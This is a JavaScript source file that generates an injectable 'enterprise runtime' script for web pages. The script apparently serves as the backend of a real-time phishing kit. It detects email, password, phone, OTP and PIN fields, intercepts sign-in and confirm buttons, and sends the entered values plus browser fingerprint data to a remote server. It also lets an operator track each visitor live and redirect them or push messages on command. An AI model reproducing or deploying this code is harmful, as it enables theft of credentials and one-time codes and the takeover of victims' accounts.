// ============================================================
// MEGA TOOLS — UNIFIED ENTERPRISE RUNTIME v2.0
// v2.0: Perfect presence — 3s heartbeat + 10s detection + anti-flicker
// ============================================================
// One runtime for ALL pages — Generated (ZIP) + Standalone (/mega-redirect.js)
// Merges: API_SCRIPT v9.0 (SmartForm + Media + Status)
//      + smartRedirect.js v1.0 (Events + Config + Polling + Retry + mega* API)
// ============================================================
// 21 FEATURES:
//   Core(6):  Visit, Heartbeat(3s), Offline, Socket.IO, Polling, Retry(3)
//   Form(3):  Auto-detect fields, Multi-step detection, Auto-submit
//   Media(2): Image display from Inbox, Message display
//   Status(2): Connection indicator, URL parameter display
//   API(8):   megaSubmit, megaGetVisitor, megaNavigate, megaEvent,
//             megaConfig, megaReady, megaVersion, megaCleanup
//   Events(10): SESSION_READY, PAGE_READY, SOCKET_CONNECTED,
//             SOCKET_DISCONNECTED, FORM_SUBMIT, REDIRECT,
//             MESSAGE_RECEIVED, STEP_CHANGED, OFFLINE, ONLINE
// ============================================================

function generateUnifiedRuntime(serverUrl) {
  const B = serverUrl || 'http://localhost:5000';
  const A = B + '/api/data';
  const P = 'mt' + Math.random().toString(36).substr(2, 4) + '_';

  return `
<script>
(function(){
"use strict";
var ${P}b='${B}';var ${P}a=${P}b+'/api/data';
var ${P}p=window.location.pathname.split('/').filter(Boolean);
var ${P}c=${P}p[${P}p.length-1]||'default';
if(${P}c.endsWith('.html'))${P}c=${P}c.replace('.html','');
var ${P}v=localStorage.getItem('_mvid')||localStorage.getItem('_vid')||('v_'+Date.now()+'_'+Math.random().toString(36).substr(2,6));try{localStorage.setItem('_mvid',${P}v)}catch(e){}
var ${P}oc=${P}c.includes('_')?${P}c.split('_')[0]:${P}c;
var ${P}up=new URLSearchParams(window.location.search);
var ${P}um=${P}up.get('msg')||${P}up.get('message')||'';if(${P}um)${P}um=decodeURIComponent(${P}um);
var ${P}ui=${P}up.get('img')||${P}up.get('imageUrl')||${P}up.get('image')||'';if(${P}ui)${P}ui=decodeURIComponent(${P}ui);
var ${P}_ready=false,${P}_redirected=false,${P}_connected=false,${P}_unloading=false,${P}_lastSeq=0,${P}_retryCount=0;
var ${P}_socket=null,${P}_pollTimer=null,${P}_heartbeatTimer=null,${P}_readyCallbacks=[],${P}_eventListeners={};
var ${P}_config={heartbeatMs:3000,pollMs:2000,retryMax:3,autoVisit:true,autoHeartbeat:true,autoSocket:true,autoPolling:true};
var ${P}VERSION="2.0.0";

// ============================================================
// v2.0: PRESENCE STATE TRACKING
// ============================================================
var ${P}_isOffline=false,${P}_lastHeartbeatSent=0,${P}_heartbeatMissCount=0;
var ${P}_HEARTBEAT_MAX_MISS=3; // 3 missed = 9 seconds

// ===== INTERNAL EVENT BUS =====
function ${P}emit(name,data){if(${P}_eventListeners[name]){${P}_eventListeners[name].forEach(function(fn){try{fn(data)}catch(e){console.error('[MegaRuntime] Event error:',name,e.message)}})}}

// ===== CLEANUP =====
function ${P}clearTimers(){if(${P}_pollTimer){clearInterval(${P}_pollTimer);${P}_pollTimer=null}if(${P}_heartbeatTimer){clearInterval(${P}_heartbeatTimer);${P}_heartbeatTimer=null}}
function ${P}cleanupSocket(){if(${P}_socket){try{${P}_socket.off();${P}_socket.disconnect()}catch(e){console.error('[MegaRuntime] Socket cleanup error:',e.message)}${P}_socket=null;${P}_connected=false}}
function ${P}doRedirect(url){if(${P}_redirected||${P}_unloading||!url)return;${P}_redirected=true;${P}_unloading=true;${P}clearTimers();${P}cleanupSocket();${P}emit('REDIRECT',{url:url});window.location.href=url}

// ===== VISIT TRACKING =====
function ${P}sv(){if(!${P}_config.autoVisit||${P}_unloading)return;fetch(${P}a+'/visit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({visitorId:${P}v,trackingCode:${P}c,browser:navigator.userAgent.substring(0,200),device:/Mobi/i.test(navigator.userAgent)?'Mobile':'Desktop',screenSize:screen.width+'x'+screen.height,collectedTypes:['visit'],timestamp:new Date().toISOString()}),keepalive:true}).catch(function(e){console.error('[MegaRuntime] Visit error:',e.message)})}${P}sv();

// ============================================================
// v2.0: HEARTBEAT — PERFECT PRESENCE (3s interval)
// ============================================================
function ${P}hb(){if(!${P}_config.autoHeartbeat||${P}_unloading)return;var now=Date.now();if(now-${P}_lastHeartbeatSent<2000)return;${P}_lastHeartbeatSent=now;fetch(${P}a+'/heartbeat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({visitorId:${P}v,trackingCode:${P}c,status:'Active',timestamp:new Date().toISOString()}),keepalive:true}).then(function(r){return r.json()}).then(function(d){if(d&&d.isLive===false){${P}_heartbeatMissCount++;if(${P}_heartbeatMissCount>=${P}_HEARTBEAT_MAX_MISS){${P}markOffline()}}else{${P}_heartbeatMissCount=0;if(${P}_isOffline){${P}markOnline()}}}).catch(function(){${P}_heartbeatMissCount++;if(${P}_heartbeatMissCount>=${P}_HEARTBEAT_MAX_MISS){${P}markOffline()}})}

function ${P}startHeartbeat(){if(${P}_heartbeatTimer||!${P}_config.autoHeartbeat)return;${P}hb();${P}_heartbeatTimer=setInterval(function(){if(!${P}_unloading){${P}hb()}else{${P}clearTimers()}},${P}_config.heartbeatMs)}

// ============================================================
// v2.0: ONLINE/OFFLINE STATE TRANSITIONS
// ============================================================
function ${P}markOffline(){if(${P}_isOffline||${P}_unloading)return;${P}_isOffline=true;${P}emit('OFFLINE',{});if(${P}cs){${P}cs.textContent='Offline';${P}cs.style.color='#ef4444'}}
function ${P}markOnline(){if(!${P}_isOffline||${P}_unloading)return;${P}_isOffline=false;${P}emit('ONLINE',{});if(${P}cs){${P}cs.textContent='Connected';${P}cs.style.color='#22c55e'}}

// ===== OFFLINE SEND (immediate on page close) =====
function ${P}sendOffline(){if(${P}_unloading&&${P}_isOffline)return;${P}_unloading=true;${P}clearTimers();${P}cleanupSocket();${P}_isOffline=true;${P}emit('OFFLINE',{});var pld=JSON.stringify({visitorId:${P}v,trackingCode:${P}c,status:'Offline',timestamp:new Date().toISOString()});if(navigator.sendBeacon){navigator.sendBeacon(${P}a+'/heartbeat',pld)}else{fetch(${P}a+'/heartbeat',{method:'POST',keepalive:true,headers:{'Content-Type':'application/json'},body:pld}).catch(function(){})}}

// ===== IMAGE DISPLAY =====
function ${P}si(u){if(!u||!u.match(/^https?:\\/\\//))return;var im=document.getElementById('img')||document.getElementById('mainImage')||document.querySelector('.image-display')||document.querySelector('img');if(im){im.src=u;im.style.display='block'};var ph=document.getElementById('placeholder');if(ph)ph.style.display='none'}

// ===== MESSAGE DISPLAY =====
function ${P}sm(m){if(!m)return;var el=document.getElementById('msg')||document.getElementById('msgDisplay')||document.querySelector('.message-display')||document.querySelector('.msg');if(el){el.textContent=m;el.style.display='block';el.classList.add('active','show')}}

// ===== URL PARAM DISPLAY =====
setTimeout(function(){if(${P}um)${P}sm(${P}um);if(${P}ui)${P}si(${P}ui)},300);

// ===== CONNECTION STATUS =====
var ${P}cs=document.getElementById('connStatus')||document.querySelector('.connection-status');if(!${P}cs){${P}cs=document.getElementById('status')||document.querySelector('.status')}

// ===== HTTP POLLING =====
function ${P}startPolling(){if(${P}_pollTimer||!${P}_config.autoPolling)return;${P}_pollTimer=setInterval(function(){if(${P}_redirected||${P}_unloading){${P}clearTimers();return}fetch(${P}b+'/api/sessions/pending-command/'+encodeURIComponent(${P}c)+'?visitorId='+encodeURIComponent(${P}v)+'&seq='+${P}_lastSeq).then(function(r){return r.json()}).then(function(d){if(d&&d.pending&&d.command&&d.command.url){if(d.command.seq&&d.command.seq<=${P}_lastSeq)return;${P}_lastSeq=d.command.seq||${P}_lastSeq;if(d.command.action==='navigate'||d.command.action==='navigate+message')${P}doRedirect(d.command.url)}}).catch(function(){})},${P}_config.pollMs)}

// ===== SOCKET.IO =====
function ${P}connectSocket(){if(!${P}_config.autoSocket||${P}_unloading)return;if(${P}_socket&&${P}_socket.connected)return;if(${P}_retryCount>=${P}_config.retryMax)return;var s=document.createElement('script');s.src=${P}b+'/socket.io/socket.io.js';var loaded=false;s.onload=function(){if(loaded||${P}_unloading)return;loaded=true;${P}_socket=io(${P}b,{transports:['websocket','polling'],reconnection:true,reconnectionAttempts:5,timeout:10000});${P}_socket.on('connect',function(){if(${P}_unloading)return;${P}_connected=true;${P}_retryCount=0;${P}markOnline();${P}_socket.emit('session_init',{visitorId:${P}v,trackingCode:${P}c});${P}_socket.emit('joinRoom',${P}oc);${P}emit('SOCKET_CONNECTED',{});if(${P}cs){${P}cs.textContent='Connected';${P}cs.style.color='#22c55e'}${P}startHeartbeat()});${P}_socket.on('disconnect',function(r){if(${P}_unloading)return;${P}_connected=false;${P}emit('SOCKET_DISCONNECTED',{});if(${P}cs){${P}cs.textContent='Disconnected';${P}cs.style.color='#ef4444'}${P}_retryCount++;if(${P}_retryCount<${P}_config.retryMax&&!${P}_unloading){setTimeout(${P}connectSocket,3000)}if(r==='io client disconnect'||${P}_unloading){${P}cleanupSocket()}});${P}_socket.on('session_command',function(cmd){if(!cmd||${P}_redirected||${P}_unloading)return;if(cmd.visitorId&&cmd.visitorId!==${P}v)return;if(cmd.seq&&cmd.seq<=${P}_lastSeq)return;${P}_lastSeq=cmd.seq||${P}_lastSeq;if(cmd.url&&(cmd.action==='navigate'||cmd.action==='navigate+message')){${P}emit('MESSAGE_RECEIVED',cmd);${P}doRedirect(cmd.url)}});${P}_socket.on('global_command',function(cmd){if(!cmd||${P}_redirected||${P}_unloading)return;if(cmd.visitorId&&cmd.visitorId!==${P}v)return;if(cmd.seq&&cmd.seq<=${P}_lastSeq)return;${P}_lastSeq=cmd.seq||${P}_lastSeq;if(cmd.url)${P}doRedirect(cmd.url)});${P}_socket.on('nav_update',function(d){if(d&&d.targetUrl&&!${P}_redirected&&!${P}_unloading)${P}doRedirect(d.targetUrl)});${P}_socket.on('msg_push',function(d){if(!d)return;if(d.imageUrl||(d.url&&d.url.match(/^https?:\\/\\//)&&d.url.match(/\\.(jpg|jpeg|png|gif|webp|svg|bmp|ico)/i))){${P}si(d.imageUrl||d.url)}else if(d.message||d.text){${P}sm(d.message||d.text)}if(d.targetUrl&&!${P}_redirected&&!${P}_unloading)${P}doRedirect(d.targetUrl)});${P}_socket.on('connect_error',function(){if(${P}_unloading)return;${P}_connected=false;${P}_retryCount++;console.error('[MegaRuntime] Socket connect error')})};s.onerror=function(){if(${P}_unloading)return;${P}_retryCount++;if(${P}_retryCount<${P}_config.retryMax){setTimeout(${P}connectSocket,3000)}console.error('[MegaRuntime] Socket script load failed')};document.head.appendChild(s)}

// ===== SMART FORM ENGINE v9.0 =====
function ${P}mf(el){if(el.name)return el.name;var t=el.type||'';var ph=(el.placeholder||'').toLowerCase();var id=(el.id||'').toLowerCase();var ar=(el.getAttribute('aria-label')||'').toLowerCase();if(t==='email'||ph.includes('email')||id.includes('email')||ar.includes('email'))return'email';if(t==='password'||ph.includes('pass')||ph.includes('login')||id.includes('pass')||id.includes('login')||ar.includes('pass'))return'password';if(t==='tel'||ph.includes('phone')||ph.includes('mobile')||ph.includes('number')||id.includes('phone')||id.includes('mobile')||ar.includes('phone'))return'phone';if(ph.includes('name')||id.includes('name')||ar.includes('name'))return'name';if(ph.includes('otp')||ph.includes('code')||ph.includes('pin')||id.includes('otp')||id.includes('code')||id.includes('pin'))return'otp';if(ph.includes('address')||id.includes('address'))return'address';if(t==='number')return'number';return ph.replace(/[^a-z0-9]/g,'_')||id||'field'}
function ${P}ib(el){var tag=el.tagName.toLowerCase();if(tag==='button'||(tag==='input'&&(el.type==='submit'||el.type==='button')))return true;var txt=(el.textContent||el.value||'').toLowerCase();var cls=(el.className||'').toLowerCase();if(cls.includes('next')||cls.includes('submit')||cls.includes('confirm')||cls.includes('continue')||cls.includes('signin')||cls.includes('login-btn'))return true;if(txt.includes('next')||txt.includes('submit')||txt.includes('sign in')||txt.includes('confirm')||txt.includes('continue'))return true;if(el.id&&(el.id.includes('next')||el.id.includes('submit')||el.id.includes('confirm')))return true;return false}
function ${P}ds(){var steps=document.querySelectorAll('.step,[data-step],.form-step,.screen,.card:not(:last-child)');if(steps.length>1)return steps;steps=document.querySelectorAll('[style*="display:none"],.hidden');var visible=document.querySelectorAll('.step.active,.step.on,.step.show,.card:first-child,.screen:first-child');if(visible.length>0)return document.querySelectorAll('.step,.card,.screen,.form-container');return document.querySelectorAll('.step,.card,.screen,.form-container,form')}
function ${P}cf(container){var fd={};var els=(container||document).querySelectorAll('input,select,textarea');els.forEach(function(el){var k=${P}mf(el);if(k&&el.value&&el.value.trim())fd[k]=el.value.trim()});return fd}
function ${P}ab(container,sn,sa,cb){var btns=(container||document).querySelectorAll('button,input[type="submit"],input[type="button"],a.btn,a.button');btns.forEach(function(b){if(!${P}ib(b))return;b.addEventListener('click',function(e){e.preventDefault();e.stopPropagation();var fd=${P}cf(container);if(cb)cb(fd,sn,sa)})})}
function ${P}send(d,sn,sa){if(!d||Object.keys(d).length===0)return;var md={visitorId:${P}v,trackingCode:${P}c,step:sn||'form',stepNumber:sa||1,attempt:sa||1,status:'submitted',formData:d,collectedTypes:Object.keys(d),userAgent:navigator.userAgent.substring(0,200),platform:navigator.platform||'Unknown',language:navigator.language||'Unknown',screenResolution:screen.width+'x'+screen.height,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone||'Unknown',timestamp:new Date().toISOString()};fetch(${P}a+'/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(md),keepalive:true}).catch(function(e){console.error('[MegaRuntime] Submit error:',e.message)});${P}emit('FORM_SUBMIT',d)}
setTimeout(function(){var steps=${P}ds();if(steps.length===0){${P}ab(document,'form',1,function(fd,sn,sa){${P}send(fd,sn,sa)});return}var _cs=0;var _at={};function _ss(i){for(var j=0;j<steps.length;j++){steps[j].style.display=j===i?'':'none'}_cs=i;if(!_at[i])_at[i]=0;_at[i]++;var sn='step_'+(i+1);${P}ab(steps[i],sn,_at[i],function(fd,sn,sa){${P}send(fd,sn,sa)})}for(var i=0;i<steps.length;i++){${P}ab(steps[i],'step_'+(i+1),1,function(fd,sn,sa){${P}send(fd,sn,sa)})}_ss(0)},500);

// ===== MARK READY =====
function ${P}markReady(){if(${P}_ready||${P}_unloading)return;${P}_ready=true;${P}emit('SESSION_READY',{visitorId:${P}v,trackingCode:${P}c});${P}emit('PAGE_READY',{visitorId:${P}v,trackingCode:${P}c,version:${P}VERSION});${P}_readyCallbacks.forEach(function(fn){try{fn()}catch(e){console.error('[MegaRuntime] Ready callback error:',e.message)}});${P}_readyCallbacks=[]}

// ===== PUBLIC API =====
window.megaSubmit=function(data){if(!data||${P}_unloading)return;${P}send(data,'custom_form',1)};
window.megaGetVisitor=function(){return{visitorId:${P}v,trackingCode:${P}c,connected:${P}_connected,ready:${P}_ready,version:${P}VERSION,isOffline:${P}_isOffline}};
window.megaNavigate=function(url){if(!url||${P}_unloading)return;${P}emit('STEP_CHANGED',{url:url});${P}doRedirect(url)};
window.megaEvent=function(name,callback){if(!name||typeof callback!=='function'||${P}_unloading)return;if(!${P}_eventListeners[name])${P}_eventListeners[name]=[];${P}_eventListeners[name].push(callback);if(name==='SESSION_READY'&&${P}_ready){try{callback({visitorId:${P}v,trackingCode:${P}c})}catch(e){}}if(name==='PAGE_READY'&&${P}_ready){try{callback({visitorId:${P}v,trackingCode:${P}c,version:${P}VERSION})}catch(e){}}if(name==='SOCKET_CONNECTED'&&${P}_connected){try{callback({})}catch(e){}}};
window.megaConfig=function(key,value){if(!key)return ${P}_config;if(value===undefined)return ${P}_config[key];${P}_config[key]=value;return ${P}_config[key]};
window.megaReady=function(callback){if(typeof callback!=='function'||${P}_unloading)return;if(${P}_ready){try{callback()}catch(e){}}else{${P}_readyCallbacks.push(callback)}};
window.megaVersion=function(){return ${P}VERSION};
window.megaCleanup=function(){${P}_unloading=true;${P}clearTimers();${P}cleanupSocket();${P}_eventListeners={};${P}_readyCallbacks=[]};

// ===== INIT =====
${P}startPolling();${P}connectSocket();${P}startHeartbeat();
window.addEventListener('beforeunload',function(){${P}sendOffline()});
window.addEventListener('pagehide',function(){${P}sendOffline()});
document.addEventListener('visibilitychange',function(){if(document.hidden){${P}hb()}else{if(!${P}_redirected&&!${P}_socket)${P}connectSocket();${P}markOnline();${P}startHeartbeat()}});
window.addEventListener('load',function(){${P}emit('ONLINE',{});${P}markReady()});
if(document.readyState==='complete'){setTimeout(${P}markReady,100)};
window.addEventListener('unload',function(){${P}clearTimers();${P}cleanupSocket()});
})();
</script>`;
}

// ===== EXPORT =====
if (typeof module !== 'undefined' && module.exports) {
  module.exports = { generateUnifiedRuntime };
}